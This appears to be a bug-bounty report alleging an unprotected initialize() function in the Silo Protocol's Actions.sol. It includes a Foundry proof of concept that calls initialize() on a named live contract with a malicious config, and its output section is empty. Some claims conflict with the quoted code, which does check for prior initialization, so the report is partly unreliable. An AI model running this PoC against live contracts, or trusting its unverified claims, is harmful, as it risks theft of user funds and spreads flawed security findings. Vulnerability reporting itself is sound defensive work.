**Contract hijack via unprotected initialize in Actions.sol**

_Bug Severity:_ Critical 

_Target:_ https://sonicscan.org/address/0x435Ab368F5fCCcc71554f4A8ac5F5b922bC4Dc06?utm_source=immunefi#code#F10#L43-53





**Summary:**

The Actions.sol contract acts as a middleware within the Silo Protocol. When a user interacts with core functions such as deposit or withdraw, the main protocol delegates responsibilities to this contract. This includes critical tasks such as:

- Calling accrueInterest()

- Managing reentrancy protection

- Interacting with vaults that handle funds

- Fetching shareToken and asset addresses

- Managing the hookReceiver


However, the initialize() function in Actions.sol is unprotected. It is publicly callable and lacks any access control (e.g., onlyOwner or initializer modifiers). This allows any attacker to hijack the contract, configure it with a malicious SiloConfig, and gain full control over the logic execution of the entire protocol.

Furthermore, the contract appears to have never been initialized, which makes this attack feasible on mainnet.



```solidity
// Actions.sol
    /// @notice Initialize Silo
    /// @param _siloConfig Address of ISiloConfig with full configuration for this Silo
    /// @return hookReceiver Address of the hook receiver for the silo
@audit-bug--> // ⚠️ BUG: Missing initialize call 
    function initialize(ISiloConfig _siloConfig) external returns (address hookReceiver) {
        IShareToken.ShareTokenStorage storage _sharedStorage = ShareTokenLib.getShareTokenStorage();

        require(address(_sharedStorage.siloConfig) == address(0), ISilo.SiloInitialized());

        ISiloConfig.ConfigData memory configData = _siloConfig.getConfig(address(this));

        _sharedStorage.siloConfig = _siloConfig;

        return configData.hookReceiver;
    }
```






**Impact:**

- Attacker can fully hijack the Actions.sol contract by calling initialize() with malicious config.

- The attacker can point hookReceiver, shareToken, and other vault interactions to addresses under their control.

- This allows arbitrary logic injection into protocol flows, including vault draining and disabling of reentrancy protection.

- Once hijacked, the protocol team cannot reclaim the contract, leading to permanent loss of control and user funds.





**Recommendation:**

- Protect the initialize() function with an onlyOwner or initializer modifier.

- Ensure the contract is properly initialized during deployment and can never be re-initialized.

- Consider deploying an upgrade or mitigation if the contract is already vulnerable on mainnet.





**Proof Of Concept (POC)**

The below PoC shows how an attacker called initialize function with malicious siloConfig, fake hook receiver, shareToken and malicious vaults, finally the attacker became the owner of the Actions.sol contract.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";

interface ISiloConfig {
    struct ConfigData {
        address hookReceiver;
        address silo;
    }

    function getConfig(address silo) external view returns (ConfigData memory);
}

interface IActions {
    function initialize(ISiloConfig _siloConfig) external returns (address hookReceiver);
}

contract MaliciousSiloConfig is ISiloConfig {
    function getConfig(address) external pure override returns (ConfigData memory) {
        return ConfigData({
            hookReceiver: address(0xdeadbeef),  // just test value
            silo: address(0x12345678)          // just test value
        });
    }
}

contract SiloActionsInitialize is Test {
    address constant ACTIONS = 0x1F13CcDBd7cB2021e499D23478Dc292d48211c04;

    MaliciousSiloConfig maliciousConfig;

    function setUp() public {
        vm.createSelectFork(vm.envString("SONIC_RPC_URL"), 34402746);

        // deploy mock silo config
        maliciousConfig = new MaliciousSiloConfig();
    }

    function test_Initialize() public {
        // try to initialize with attacker-controlled config
        (bool success, bytes memory data) = ACTIONS.call(
            abi.encodeWithSelector(
                IActions.initialize.selector,
                maliciousConfig
            )
        );

        require(success, string(data));
    }
}
```

**PoC Output:**